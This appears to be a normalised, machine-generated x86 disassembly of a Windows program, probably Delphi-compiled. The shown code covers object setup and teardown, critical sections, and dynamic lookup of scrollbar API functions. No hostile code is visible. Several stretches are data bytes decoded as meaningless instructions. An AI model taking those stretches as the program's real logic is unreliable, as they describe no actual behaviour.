mov eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4234f6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049e8
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_421d5c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055c0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_422a14
sub [ edx ] eax
scasd [ edi ]
sub [ edx ] eax
mov ecx 0x8d004229
sub [ edx ] eax
xchg ebp eax
sub [ edx ] eax
popfd
sub [ edx ] eax
sub [ edx ] eax
std
sub [ edx ] eax
pop es
sub al [ edx ]
retn
sub_422a3c
sub [ edx ] eax
shr [ ecx ] cl
inc edx
add bl bl
sub [ edx ] eax
jecxz r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edx
add bl ch
sub [ edx ] eax
add al [ eax ]
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub [ edx ] eax
std
sub [ edx ] eax
pop es
sub al [ edx ]
retn
cmp ch [ ebx ]
sub al [ edx ]
sub al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
fsubr [ edx ]
inc edx
add [ edi + 0x2a ] cl
inc edx
add [ eax ] al
add [ eax ] al
add al bl
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ edx ]
cmp dl [ ebx ]
sub al [ edx ]
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
xchg ebx eax
cld
xor [ ecx + ecx * 4 + 0x20 ] ah
popad
outsb
popad
jb r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_422cac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4055c0
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422b9d
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422c38
mov [ rw-data ] eax
xor [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] eax
xor al 0x40
add [ eax ] ch
push esi
inc eax
add [ esi + edx * 2 ] dh
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esi + edx * 2 + 0x40 ] al
add al ch
xor [ eax ] eax
mov eax 0xe004236
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + 0x42 ] bl
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
adc [ eax ] al
and al 0x0
add [ eax ] al
or al 0x54
dec eax
insb
jo r-xdata
dec edi
sub al [ edx ]
add [ eax ] al
add [ eax ] al
fsubr [ edx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
sub al [ edx ]
push ss
inc esi
add [ edi + edi * 8 ] dh
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] dh
push ss
inc esi
add [ esi ] dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov [ eax ] edx
sub_422b20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_422cac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4055c0
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422b9d
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422c38
mov [ rw-data ] eax
sub_422ba4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422c38
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4055ec
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_422bfc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4055c0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_422c38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_421d20
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421d20
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421d20
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f6c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_422cac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_422bfc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_421d70
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4055a8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cc08
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4055a8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cc08
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422bfc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_421d70
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422bfc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_421d70
mov ecx r-xdata
call sub_4055ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422db4
lea eax [ ebp - 0xc ]
call sub_4055a8
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
sub edx 0xfffffff8
sub_422dcc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_421d5c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_422e0c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_421d5c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_422e3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_421d5c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422fd5
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_421d5c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
mov eax esi
xor edx edx
call sub_421d5c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_421d5c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_421d5c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_422fdc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230c8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049e8
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_421d5c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055c0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_421d5c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055c0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_4232f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233f2
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049e8
lea eax [ ebp - 0x10 ]
call sub_4055a8
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_421d5c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4055c0
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_423410
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4234f6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049e8
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_421d5c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055c0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055ec
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_423510
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40561c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4055c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423566
lea eax [ ebp - 0x4 ]
call sub_4055a8
retn
lea eax [ ebx + 0xc ]
call sub_4055a8
sub_42356c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4232f8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423608
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
call sub_422e0c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_422e3c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_422fdc
sub_42362c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_421d5c
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_421d5c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413730
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_421d5c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413730
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413730
sub_4236b8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_422dcc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403234
mov eax [ esi + 0x14 ]
call sub_403234
mov eax [ esi + 0x10 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4055a8
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42370c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42374a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_423754
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423780
retn
sub_42378c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237c4
retn
mov eax [ rw-data ]
call sub_403234
sub_4237d0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_423804
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42382c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_423aae
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423adc
retn
sub_423bc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_423c04
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_423c5c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c88
retn
sub_423c94
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_423c4c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e52
mov eax [ rw-data ]
call sub_423c54
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_423e54
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_423c4c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42420e
mov eax [ rw-data ]
call sub_423c54
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
